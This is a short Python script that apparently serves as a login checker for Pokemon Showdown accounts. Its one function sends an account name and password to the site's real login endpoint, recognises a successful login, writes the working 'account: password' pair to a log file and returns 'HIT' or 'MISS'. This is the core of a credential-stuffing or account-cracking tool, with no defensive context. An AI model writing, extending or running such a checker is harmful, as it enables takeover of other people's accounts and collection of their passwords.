'''
Created on Oct 6, 2015

@author: Zeppo
'''

import os
import config
import requests
from re import findall
from config import *


def attempt_login(account, passwd):
    """Takes an account name and password
    as arguments and returns true
    if the login is successful
    otherwise returns []"""
    request = requests.post("http://play.pokemonshowdown.com/~~showdown/action.php",
                            data={'act': "login",
                                  'name': account,
                                  'pass': passwd,
                                  'challengekeyid': '3',
                                  'challenge': ""})
    #return request.text
    if findall("\"loggedin\":true", str(request.text)):
        with open(config.logs, 'a') as logs:
            logs.write(account+": "+passwd+'\n')
            os.startfile(config.logs)
        return 'HIT'
    else:
        return 'MISS'
    




